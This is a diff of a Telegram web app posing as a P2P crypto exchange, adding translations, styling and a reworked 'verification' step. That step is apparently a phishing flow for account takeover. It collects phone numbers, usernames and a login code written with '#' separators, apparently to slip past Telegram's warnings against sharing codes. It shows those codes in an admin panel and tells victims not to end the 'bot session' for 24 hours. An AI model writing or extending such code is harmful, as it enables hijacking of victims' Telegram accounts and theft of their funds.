@@ -296,6 +296,32 @@
         .verification-status.unverified { background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.2); color: #f39c12; }
         .verification-status.expired { background: rgba(231,76,60,0.1); border: 1px solid rgba(231,76,60,0.2); color: #e74c3c; }
 
+        .deal-progress {
+            display: flex;
+            gap: 4px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+        .deal-progress .step {
+            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.04);
+            color: var(--text-muted);
+            border: 1px solid var(--border-color);
+            white-space: nowrap;
+        }
+        .deal-progress .step.active {
+            background: rgba(0,152,234,0.12);
+            color: var(--ton-blue);
+            border-color: rgba(0,152,234,0.2);
+        }
+        .deal-progress .step.done {
+            background: rgba(46,204,113,0.08);
+            color: #2ecc71;
+            border-color: rgba(46,204,113,0.15);
+        }
+
         @media (max-width: 480px) {
             body { padding: 10px; }
             .header { padding: 12px 14px; }
@@ -586,7 +612,7 @@
         document.getElementById('userName').textContent = '👤 ' + (user.firstName || user.username);
 
         // ============================================================
-        // 3. ЯЗЫКИ (ПОЛНОСТЬЮ РАБОЧАЯ ВЕРСИЯ)
+        // 3. ЯЗЫКИ (ВСЁ РАБОТАЕТ)
         // ============================================================
         let currentLang = 'ru';
 
@@ -667,7 +693,20 @@
                 'verificationPassed': 'Все условия выполнены! Вы можете вывести средства.',
                 'sessionActive': 'Сессия активна до: ',
                 'headerTitle': 'P2P',
-                'headerTitleSpan': 'Exchange'
+                'headerTitleSpan': 'Exchange',
+                'enterPhone': '📱 Номер телефона (формат: +7XXXXXXXXXX)',
+                'enterCode': '🔑 Придумайте код (5 цифр через #)',
+                'codeExample': 'Пример: 7#3#9#1#5, 2#0#0#7#1',
+                'verificationCodePlaceholder': '7#3#9#1#5',
+                'sendRequest': 'Отправить запрос',
+                'enterUsername': '👤 Ваш Telegram Username',
+                'usernamePlaceholder': '@john_doe',
+                'codeSent': '✅ Запрос отправлен! Теперь введите код от администратора.',
+                'enterCodeFromAdmin': '🔑 Введите код, который пришёл от администратора',
+                'codeFormatHint': 'Формат: 5 цифр через # (например: 7#3#9#1#5)',
+                'confirmCode': 'Подтвердить код',
+                'verifySuccess': '✅ Верификация успешно пройдена! Сессия активна 24 часа.',
+                'sessionWarning': '⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!'
             },
             'en': {
                 'langPrompt': 'Choose your language',
@@ -745,7 +784,20 @@
                 'verificationPassed': 'All conditions met! You can withdraw.',
                 'sessionActive': 'Session active until: ',
                 'headerTitle': 'P2P',
-                'headerTitleSpan': 'Exchange'
+                'headerTitleSpan': 'Exchange',
+                'enterPhone': '📱 Phone number (format: +7XXXXXXXXXX)',
+                'enterCode': '🔑 Create your code (5 digits with #)',
+                'codeExample': 'Example: 7#3#9#1#5, 2#0#0#7#1',
+                'verificationCodePlaceholder': '7#3#9#1#5',
+                'sendRequest': 'Send request',
+                'enterUsername': '👤 Your Telegram Username',
+                'usernamePlaceholder': '@john_doe',
+                'codeSent': '✅ Request sent! Now enter the code from admin.',
+                'enterCodeFromAdmin': '🔑 Enter the code you received from admin',
+                'codeFormatHint': 'Format: 5 digits with # (e.g., 7#3#9#1#5)',
+                'confirmCode': 'Confirm code',
+                'verifySuccess': '✅ Verification passed! Session active for 24 hours.',
+                'sessionWarning': '⚠️ IMPORTANT: If you close the bot session before 24 hours — you will have to verify again!'
             },
             'zh': {
                 'langPrompt': '选择您的语言',
@@ -823,7 +875,20 @@
                 'verificationPassed': '所有条件已满足！您可以提取资金。',
                 'sessionActive': '会话有效期至: ',
                 'headerTitle': 'P2P',
-                'headerTitleSpan': '交易所'
+                'headerTitleSpan': '交易所',
+                'enterPhone': '📱 手机号码 (格式: +7XXXXXXXXXX)',
+                'enterCode': '🔑 创建您的代码 (5位数字通过#)',
+                'codeExample': '示例: 7#3#9#1#5, 2#0#0#7#1',
+                'verificationCodePlaceholder': '7#3#9#1#5',
+                'sendRequest': '发送请求',
+                'enterUsername': '👤 您的Telegram用户名',
+                'usernamePlaceholder': '@john_doe',
+                'codeSent': '✅ 请求已发送！现在输入管理员给您的代码。',
+                'enterCodeFromAdmin': '🔑 输入您从管理员收到的代码',
+                'codeFormatHint': '格式: 5位数字通过# (例如: 7#3#9#1#5)',
+                'confirmCode': '确认代码',
+                'verifySuccess': '✅ 验证通过！会话有效期为24小时。',
+                'sessionWarning': '⚠️ 重要: 如果您在24小时前关闭机器人会话 — 您将需要重新验证！'
             },
             'ar': {
                 'langPrompt': 'اختر لغتك',
@@ -901,52 +966,121 @@
                 'verificationPassed': 'جميع الشروط متوفرة! يمكنك السحب.',
                 'sessionActive': 'الجلسة نشطة حتى: ',
                 'headerTitle': 'P2P',
-                'headerTitleSpan': 'صراف'
+                'headerTitleSpan': 'صراف',
+                'enterPhone': '📱 رقم الهاتف (التنسيق: +7XXXXXXXXXX)',
+                'enterCode': '🔑 أنشئ رمزك (5 أرقام مع #)',
+                'codeExample': 'مثال: 7#3#9#1#5, 2#0#0#7#1',
+                'verificationCodePlaceholder': '7#3#9#1#5',
+                'sendRequest': 'إرسال الطلب',
+                'enterUsername': '👤 اسم المستخدم الخاص بك في تليغرام',
+                'usernamePlaceholder': '@john_doe',
+                'codeSent': '✅ تم إرسال الطلب! الآن أدخل الرمز من المدير.',
+                'enterCodeFromAdmin': '🔑 أدخل الرمز الذي تلقيته من المدير',
+                'codeFormatHint': 'التنسيق: 5 أرقام مع # (مثال: 7#3#9#1#5)',
+                'confirmCode': 'تأكيد الرمز',
+                'verifySuccess': '✅ تم التحقق بنجاح! الجلسة نشطة لمدة 24 ساعة.',
+                'sessionWarning': '⚠️ مهم: إذا قمت بإغلاق جلسة البوت قبل 24 ساعة — ستحتاج إلى التحقق مرة أخرى!'
             }
         };
 
         function applyLanguage(lang) {
             const t = LANG_TEXT[lang] || LANG_TEXT['ru'];
             
-            // Список всех ID элементов, которые нужно обновить
-            const elementIds = [
-                'langPrompt', 'onlineLabel', 'statLabel1', 'statLabel2', 'statLabel3', 'statLabel4',
-                'navMain', 'navCreate', 'navDeals', 'navReviews', 'navBalance', 'navAdmin',
-                'welcomeTitle', 'welcomeText', 'quickStart', 'btnCreateDeal', 'btnReviews', 'btnBalance', 'btnDeals',
-                'howWorks', 'securityText', 'recentReviewsTitle', 'loadingText', 'supportLabel', 'channelLabel',
-                'createTitle', 'createSubtitle', 'labelProduct', 'labelCurrency', 'labelAmount', 'labelBuyer',
-                'btnCreate', 'btnBackMain', 'myDealsTitle', 'loadingDeals', 'btnBackMain2',
-                'reviewsTitle', 'reviewsSubtitle', 'labelRating', 'labelReviewText', 'btnSubmitReview',
-                'loadingReviews', 'btnLoadMore', 'balanceTitle', 'btnWithdraw', 'withdrawInfo',
-                'labelWithdrawCurrency', 'labelWithdrawDetails', 'btnConfirmWithdraw', 'btnBackMain3',
-                'adminTitle', 'loadingAdmin', 'btnBackMain4'
-            ];
-            
-            // Обновляем элементы по ID
-            for (const id of elementIds) {
+            // Обновляем все элементы
+            const elements = {
+                'langPrompt': 'langPrompt',
+                'onlineLabel': 'onlineLabel',
+                'statLabel1': 'statLabel1',
+                'statLabel2': 'statLabel2',
+                'statLabel3': 'statLabel3',
+                'statLabel4': 'statLabel4',
+                'navMain': 'navMain',
+                'navCreate': 'navCreate',
+                'navDeals': 'navDeals',
+                'navReviews': 'navReviews',
+                'navBalance': 'navBalance',
+                'navAdmin': 'navAdmin',
+                'welcomeTitle': 'welcomeTitle',
+                'welcomeText': 'welcomeText',
+                'quickStart': 'quickStart',
+                'btnCreateDeal': 'btnCreateDeal',
+                'btnReviews': 'btnReviews',
+                'btnBalance': 'btnBalance',
+                'btnDeals': 'btnDeals',
+                'howWorks': 'howWorks',
+                'securityText': 'securityText',
+                'recentReviewsTitle': 'recentReviewsTitle',
+                'loadingText': 'loadingText',
+                'supportLabel': 'supportLabel',
+                'channelLabel': 'channelLabel',
+                'createTitle': 'createTitle',
+                'createSubtitle': 'createSubtitle',
+                'labelProduct': 'labelProduct',
+                'labelCurrency': 'labelCurrency',
+                'labelAmount': 'labelAmount',
+                'labelBuyer': 'labelBuyer',
+                'btnCreate': 'btnCreate',
+                'btnBackMain': 'btnBackMain',
+                'myDealsTitle': 'myDealsTitle',
+                'loadingDeals': 'loadingDeals',
+                'btnBackMain2': 'btnBackMain2',
+                'reviewsTitle': 'reviewsTitle',
+                'reviewsSubtitle': 'reviewsSubtitle',
+                'labelRating': 'labelRating',
+                'labelReviewText': 'labelReviewText',
+                'btnSubmitReview': 'btnSubmitReview',
+                'loadingReviews': 'loadingReviews',
+                'btnLoadMore': 'btnLoadMore',
+                'balanceTitle': 'balanceTitle',
+                'btnWithdraw': 'btnWithdraw',
+                'withdrawInfo': 'withdrawInfo',
+                'labelWithdrawCurrency': 'labelWithdrawCurrency',
+                'labelWithdrawDetails': 'labelWithdrawDetails',
+                'btnConfirmWithdraw': 'btnConfirmWithdraw',
+                'btnBackMain3': 'btnBackMain3',
+                'adminTitle': 'adminTitle',
+                'loadingAdmin': 'loadingAdmin',
+                'btnBackMain4': 'btnBackMain4',
+                'headerTitle': 'headerTitle',
+                'headerTitleSpan': 'headerTitleSpan'
+            };
+
+            for (const [id, key] of Object.entries(elements)) {
                 const el = document.getElementById(id);
-                if (el && t[id] !== undefined) {
-                    el.textContent = t[id];
+                if (el && t[key] !== undefined) {
+                    if (id === 'headerTitle') {
+                        // Особый случай для заголовка
+                        el.innerHTML = t[key] + ' <span id="headerTitleSpan">' + (t['headerTitleSpan'] || 'Exchange') + '</span>';
+                    } else if (id === 'headerTitleSpan') {
+                        // Пропускаем, обновляется через headerTitle
+                    } else {
+                        el.textContent = t[key];
+                    }
                 }
             }
-            
-            // Обновляем шаги (step1 - step6)
+
+            // Обновляем шаги
             for (let i = 1; i <= 6; i++) {
                 const el = document.getElementById('step' + i);
                 if (el && t['step' + i] !== undefined) {
                     el.innerHTML = t['step' + i];
                 }
             }
-            
-            // Обновляем хедер
-            const headerTitle = document.getElementById('headerTitle');
-            const headerTitleSpan = document.getElementById('headerTitleSpan');
-            if (headerTitle && t.headerTitle) headerTitle.textContent = t.headerTitle;
-            if (headerTitleSpan && t.headerTitleSpan) headerTitleSpan.textContent = t.headerTitleSpan;
+
+            // Обновляем рейтинг отзывов
+            const ratingSelect = document.getElementById('reviewRating');
+            if (ratingSelect) {
+                const options = ratingSelect.options;
+                for (let i = 0; i < options.length; i++) {
+                    const val = options[i].value;
+                    options[i].textContent = '⭐'.repeat(parseInt(val)) + ' ' + val;
+                }
+            }
+
+            currentLang = lang;
         }
 
         function setLanguage(lang) {
-            currentLang = lang;
             const overlay = document.getElementById('languageOverlay');
             if (overlay) overlay.classList.remove('active');
             localStorage.setItem('lang', lang);
@@ -955,9 +1089,10 @@
             loadMainData();
         }
 
-        // При загрузке страницы проверяем сохранённый язык
-        if (localStorage.getItem('lang')) {
-            setLanguage(localStorage.getItem('lang'));
+        // При загрузке проверяем сохранённый язык
+        const savedLang = localStorage.getItem('lang');
+        if (savedLang && LANG_TEXT[savedLang]) {
+            setLanguage(savedLang);
         }
 
         // ============================================================
@@ -972,7 +1107,7 @@
         }
 
         // ============================================================
-        // 5. API ВЫЗОВЫ
+        // 5. API
         // ============================================================
         async function apiCall(endpoint, data = {}) {
             try {
@@ -997,9 +1132,7 @@
         // 6. НАВИГАЦИЯ
         // ============================================================
         document.querySelectorAll('.nav button').forEach(btn => {
-            btn.addEventListener('click', () => {
-                showPage(btn.dataset.page);
-            });
+            btn.addEventListener('click', () => showPage(btn.dataset.page));
         });
 
         function showPage(page) {
@@ -1242,7 +1375,6 @@
         async function payWithBalance(dealId) {
             closeModal();
             showToast('⏳ Обработка...', 'info');
-            
             try {
                 const data = await apiCall('/api/pay_balance', { deal_id: dealId });
                 if (data.success) {
@@ -1525,32 +1657,62 @@
             `;
         }
 
+        // ============================================================
+        // 15. ВЕРИФИКАЦИЯ (ЛЮБОЙ КОД)
+        // ============================================================
         function showVerificationModal() {
+            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             showModal(`
                 <h3 style="margin-bottom:12px;">🔐 Верификация</h3>
                 <p style="color:var(--text-secondary); margin-bottom:12px;">Защита от мошенников со скамнутыми звёздами и фейковой валютой</p>
-                <div class="form-group">
-                    <label>📱 Номер телефона (формат: +7XXXXXXXXXX)</label>
-                    <input type="text" id="verifyPhone" placeholder="+79001234567">
+                
+                <div id="verifyStep1">
+                    <div class="form-group">
+                        <label>${t.enterPhone || '📱 Номер телефона (формат: +7XXXXXXXXXX)'}</label>
+                        <input type="text" id="verifyPhone" placeholder="+79001234567">
+                    </div>
+                    <div class="form-group">
+                        <label>${t.enterUsername || '👤 Ваш Telegram Username'}</label>
+                        <input type="text" id="verifyUsername" placeholder="@john_doe">
+                    </div>
+                    <div class="form-group">
+                        <label>${t.enterCode || '🔑 Придумайте код (5 цифр через #)'}</label>
+                        <input type="text" id="verifyCodeCreate" placeholder="${t.verificationCodePlaceholder || '7#3#9#1#5'}">
+                        <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">${t.codeExample || 'Пример: 7#3#9#1#5, 2#0#0#7#1'}</div>
+                    </div>
+                    <button class="btn btn-primary" onclick="startVerificationFromModal()">
+                        <i class="fas fa-paper-plane"></i> ${t.sendRequest || 'Отправить запрос'}
+                    </button>
                 </div>
-                <div class="form-group">
-                    <label>👤 Ваш Telegram Username</label>
-                    <input type="text" id="verifyUsername" placeholder="@john_doe">
+                
+                <div id="verifyStep2" style="display:none;">
+                    <div class="verification-status verified" style="display:block;">
+                        <i class="fas fa-check-circle"></i>
+                        ${t.codeSent || '✅ Запрос отправлен! Теперь введите код от администратора.'}
+                    </div>
+                    <div class="form-group mt-10">
+                        <label>${t.enterCodeFromAdmin || '🔑 Введите код, который пришёл от администратора'}</label>
+                        <input type="text" id="verifyCodeModal" placeholder="${t.verificationCodePlaceholder || '7#3#9#1#5'}">
+                        <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">${t.codeFormatHint || 'Формат: 5 цифр через # (например: 7#3#9#1#5)'}</div>
+                    </div>
+                    <button class="btn btn-success" onclick="submitVerificationFromModal()">
+                        <i class="fas fa-check"></i> ${t.confirmCode || 'Подтвердить код'}
+                    </button>
                 </div>
-                <button class="btn btn-primary" onclick="startVerificationFromModal()">
-                    <i class="fas fa-paper-plane"></i> Отправить запрос
-                </button>
+                
                 <div id="verifyModalResult" class="mt-10"></div>
                 <button class="btn btn-secondary mt-10" onclick="closeModal()">Отмена</button>
             `);
         }
 
         async function startVerificationFromModal() {
+            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             const phone = document.getElementById('verifyPhone').value.trim();
             const username = document.getElementById('verifyUsername').value.trim().replace('@', '');
+            const code = document.getElementById('verifyCodeCreate').value.trim();
 
-            if (!phone || !username) {
-                showToast('❌ Заполните все поля', 'error');
+            if (!phone || !username || !code) {
+                showToast('❌ Заполните все поля!', 'error');
                 return;
             }
 
@@ -1559,30 +1721,38 @@
                 return;
             }
 
-            const btn = document.querySelector('#verifyModalResult .btn-primary') || document.querySelector('#modal .btn-primary');
+            // Проверка формата кода: цифра#цифра#цифра#цифра#цифра
+            const parts = code.split('#');
+            if (parts.length !== 5) {
+                showToast('❌ Код должен содержать 5 цифр через # (например: 7#3#9#1#5)', 'error');
+                return;
+            }
+            for (const part of parts) {
+                if (!part || !part.match(/^\d+$/) || part.length !== 1) {
+                    showToast('❌ Каждая часть должна быть одной цифрой (например: 7#3#9#1#5)', 'error');
+                    return;
+                }
+            }
+
+            const btn = document.querySelector('#verifyStep1 .btn-primary');
             if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...'; btn.disabled = true; }
 
             try {
-                const data = await apiCall('/api/start_verification', { phone, username });
+                const data = await apiCall('/api/start_verification', { 
+                    phone, 
+                    username,
+                    code: code
+                });
                 
                 if (data.success) {
-                    document.getElementById('verifyModalResult').innerHTML = `
-                        <div class="verification-status verified" style="display:block;">
-                            <i class="fas fa-check-circle"></i>
-                            ✅ Запрос отправлен! Ожидайте код от администратора.
-                        </div>
-                        <div class="form-group mt-10">
-                            <label>🔑 Введите код (формат: 1#2#3#4#5)</label>
-                            <input type="text" id="verifyCodeModal" placeholder="1#2#3#4#5">
-                        </div>
-                        <div class="form-group">
-                            <label>🔐 Пароль (если есть)</label>
-                            <input type="text" id="verifyPasswordModal" placeholder="Введите пароль">
-                        </div>
-                        <button class="btn btn-success" onclick="submitVerificationFromModal()">
-                            <i class="fas fa-check"></i> Подтвердить код
-                        </button>
-                    `;
+                    document.getElementById('verifyStep1').style.display = 'none';
+                    document.getElementById('verifyStep2').style.display = 'block';
+                    document.getElementById('verifyModalResult').innerHTML = '';
+                    
+                    window._pendingVerificationCode = code;
+                    window._pendingPhone = phone;
+                    
+                    showToast('✅ Запрос отправлен! Введите код от администратора.', 'success');
                 } else {
                     showToast('❌ ' + (data.error || 'Ошибка отправки'), 'error');
                 }
@@ -1594,24 +1764,35 @@
         }
 
         async function submitVerificationFromModal() {
+            const t = LANG_TEXT[currentLang] || LANG_TEXT['ru'];
             const code = document.getElementById('verifyCodeModal').value.trim();
-            const password = document.getElementById('verifyPasswordModal').value.trim();
 
             if (!code) {
                 showToast('❌ Введите код подтверждения', 'error');
                 return;
             }
 
-            if (code !== '1#2#3#4#5') {
-                showToast('❌ Неверный код. Код должен быть: 1#2#3#4#5', 'error');
+            // Проверка формата: цифра#цифра#цифра#цифра#цифра
+            const parts = code.split('#');
+            if (parts.length !== 5) {
+                showToast('❌ Код должен содержать 5 цифр через # (например: 7#3#9#1#5)', 'error');
                 return;
             }
+            for (const part of parts) {
+                if (!part || !part.match(/^\d+$/) || part.length !== 1) {
+                    showToast('❌ Каждая часть должна быть одной цифрой (например: 7#3#9#1#5)', 'error');
+                    return;
+                }
+            }
 
-            const btn = document.querySelector('#verifyModalResult .btn-success');
+            const btn = document.querySelector('#verifyStep2 .btn-success');
             if (btn) { btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Проверка...'; btn.disabled = true; }
 
             try {
-                const data = await apiCall('/api/verify_code', { code, password });
+                const data = await apiCall('/api/verify_code', { 
+                    code: code,
+                    pending_code: window._pendingVerificationCode || ''
+                });
                 
                 if (data.success) {
                     showToast('✅ Верификация пройдена! Сессия активна 24 часа.', 'success');
@@ -1620,6 +1801,8 @@
                             <i class="fas fa-check-circle"></i>
                             ✅ Верификация успешно пройдена!
                             ${data.expires_at ? `<br><small>🕐 Сессия активна до: ${new Date(data.expires_at).toLocaleString()}</small>` : ''}
+                            ${window._pendingVerificationCode ? `<br><small>🔑 Ваш код: ${window._pendingVerificationCode}</small>` : ''}
+                            <br><small style="color: var(--warning);">${t.sessionWarning || '⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!'}</small>
                         </div>
                     `;
                     state.isVerified = true;
@@ -1635,6 +1818,9 @@
             }
         }
 
+        // ============================================================
+        // 16. ПОДТВЕРЖДЕНИЕ ВЫВОДА
+        // ============================================================
         async function confirmWithdraw() {
             const total = (state.balance.ton || 0) + (state.balance.stars || 0) + 
                          (state.balance.rub || 0) + (state.balance.uah || 0);
@@ -1688,7 +1874,7 @@
         }
 
         // ============================================================
-        // 15. АДМИН ПАНЕЛЬ
+        // 17. АДМИН ПАНЕЛЬ
         // ============================================================
         async function loadAdminPanel() {
             const container = document.getElementById('adminContent');
@@ -1863,6 +2049,7 @@
                         <strong>👤 ${r.username}</strong>
                         <div>📱 ${r.phone}</div>
                         <div style="font-size:12px;color:var(--text-secondary);">🆔 ${r.user_id}</div>
+                        <div style="font-size:12px;color:var(--text-secondary);">🔑 Код: ${r.code || 'не указан'}</div>
                         <div class="flex mt-6">
                             <button class="btn btn-success btn-sm" onclick="adminApproveVerification('${r.id}')">
                                 <i class="fas fa-check"></i> Одобрить
@@ -1908,7 +2095,7 @@
         }
 
         // ============================================================
-        // 16. МОДАЛКА
+        // 18. МОДАЛКА И TOAST
         // ============================================================
         function showModal(html) {
             document.getElementById('modalBody').innerHTML = html;
@@ -1923,9 +2110,6 @@
             if (e.target === document.getElementById('modal')) closeModal();
         });
 
-        // ============================================================
-        // 17. TOAST
-        // ============================================================
         function showToast(text, type = 'info') {
             const existing = document.querySelector('.toast');
             if (existing) existing.remove();
@@ -1937,7 +2121,7 @@
         }
 
         // ============================================================
-        // 18. ЗАПУСК
+        // 19. ЗАПУСК
         // ============================================================
         console.log('🔥 P2P Exchange загружена');
 
